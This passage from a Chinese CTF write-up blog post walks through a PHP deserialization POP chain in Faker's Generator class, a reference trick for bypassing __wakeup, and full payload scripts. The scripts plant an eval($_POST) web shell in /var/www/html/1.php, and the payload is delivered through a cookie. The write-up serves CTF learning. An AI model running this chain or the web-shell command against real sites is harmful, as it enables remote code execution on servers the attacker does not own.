invoke__">preg_match</span>(<span class="string">&#x27;|^([a-zA-Z0-9\\\]+)-&gt;([a-zA-Z0-9]+)$|&#x27;</span>, <span class="variable">$format</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>] = [<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ext</span>(<span class="variable">$matches</span>[<span class="number">1</span>]), <span class="variable">$matches</span>[<span class="number">2</span>]];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$provider</span>, <span class="variable">$format</span>)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>] = [<span class="variable">$provider</span>, <span class="variable">$format</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Unknown format &quot;%s&quot;&#x27;</span>, <span class="variable">$format</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到Generator类中有很多魔术方法，其中注意<code>__get</code>魔术方法调用了<code>format</code>方法<br>而<code>format</code>方法最终调用了<code>call_user_func_array</code>函数<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670173916845-415c1480-f1d5-475f-bcf8-53dfcdabb728.png#averageHue=%23edecec&clientId=u1e24a0ed-bffb-4&from=paste&height=208&id=u2bab5bfa&name=image.png&originHeight=260&originWidth=806&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14969&status=done&style=none&taskId=u88fb2258-82bb-4f8a-8390-1a7410b0c9b&title=&width=644.8" alt="image.png"><br>和call_user_func一样都是回调函数，其中的<code>$format</code>参数在<code>getFormatter</code>方法中处理，该方法会去检索属性<code>formatters</code>，如果我们的$format是formatter数组的键名，那么就直接返回<code>formatters[$format];</code><br>到这里pop链就很清晰了，题目中有__destruct方法，也就是<code>User::_destruct=&gt;\Faker\Generator::__get=&gt;Generator::format()=&gt;call_user_func_array</code>，但是还有个问题，Generator还有一个<code>__wakeup</code>会滞空我们的formatter数组，我们得想办法绕过</p>
<h3 id="绕过-wakeup滞空"><a href="#绕过-wakeup滞空" class="headerlink" title="绕过__wakeup滞空"></a>绕过__wakeup滞空</h3><p>这道题和十月赛的haide wabo高度相似，我们这里可以利用引用来绕过滞空</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;t1 = &amp;<span class="variable">$obj</span>-&gt;t2;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;t1=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$elem</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;elem = <span class="string">&quot;kino&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">test1</span>(<span class="variable">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">4</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;t2 = <span class="variable language_">$this</span>-&gt;elem;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="comment">//echo $s;</span></span><br><span class="line"><span class="variable">$t2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$t2</span>-&gt;obj-&gt;t1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output:2134kino</span></span><br></pre></td></tr></table></figure>
<p>从上述例子可以看出如果想要避免t1被滞空，我们将t1指向test.t2就可以避免，并且触发顺序也可以理解一下</p>
<h3 id="编写POP"><a href="#编写POP" class="headerlink" title="编写POP"></a>编写POP</h3><p>最后了解了一切即可开始编写pop：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span>  &#123;</span><br><span class="line">    <span class="title class_">include</span> &quot;<span class="title class_">vendor</span>/<span class="title class_">autoload</span>.<span class="title class_">php</span>&quot;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">\Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="variable">$func</span>=<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;&gt;&#x27;/var/www/html/1.php&#x27;&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable">$ser</span>=\opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line"><span class="comment">//    echo $payload;</span></span><br><span class="line">   <span class="variable">$new</span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s:8:\&quot;password\&quot;&quot;</span>,<span class="string">&#x27;s:14:&quot;&#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%00&#x27;</span>).<span class="string">&#x27;User&#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%00&#x27;</span>).<span class="string">&#x27;password&quot;&#x27;</span>,<span class="variable">$payload</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$new</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters=&amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class User&#123;</span></span><br><span class="line"><span class="comment">//    private $password;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//echo serialize(new User());</span></span><br><span class="line"><span class="comment">//echo urlencode(serialize(new User()));</span></span><br><span class="line"><span class="comment">#O:4:&quot;User&quot;:1:&#123;s:14:&quot; User password&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">#O%3A4%3A%22User%22%3A1%3A%7Bs%3A14%3A%22%00User%00password%22%3BN%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这边需要先手动把passowrd改为public类型再修改回private类型，因为有引用，但其实根据我的测试，由于PHP7.1+对属性类型不敏感，所以那一步操作是完全可以优化的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span>  &#123;</span><br><span class="line">    <span class="title class_">include</span> &quot;<span class="title class_">vendor</span>/<span class="title class_">autoload</span>.<span class="title class_">php</span>&quot;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">\Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="variable">$func</span>=<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;&gt;&#x27;/var/www/html/1.php&#x27;&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable">$ser</span>=\opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters=&amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class User&#123;</span></span><br><span class="line"><span class="comment">//    private $password;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//echo serialize(new User());</span></span><br><span class="line"><span class="comment">//echo urlencode(serialize(new User()));</span></span><br><span class="line"><span class="comment">#O:4:&quot;User&quot;:1:&#123;s:14:&quot; User password&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">#O%3A4%3A%22User%22%3A1%3A%7Bs%3A14%3A%22%00User%00password%22%3BN%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后忘了说了，在cookie里可以发现base64编码的序列化字符串，所以传参入口在cookie，将上述payload传入，即可写shell进1.php，最后getshell。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670177590876-c9488507-cd25-44ea-9dcb-0226bd2b5cd2.png#averageHue=%23e8ca9b&clientId=ua02f3740-acd5-4&from=paste&height=741&id=ue7bd7132&name=image.png&originHeight=926&originWidth=1693&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61670&status=done&style=none&taskId=ubeb0ae51-77ea-406f-a859-77294b801ba&title=&width=1354.4" alt="image.png"><br>赐教！</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>第一次模拟打，解题数是3&#x2F;4，感觉不错，现在就要先告一段落了，要去搞期末了呜呜</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1>
    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/DASCTF/" class="tag">#DASCTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/%E6%97%B6%E9%9A%94%E5%8D%8A%E5%B9%B4%E7%9A%84%E6%80%BB%E7%BB%93/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">时隔半年的总结</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/DASCTF%20MAY%20%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">DASCTF MAY出题人挑战赛</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>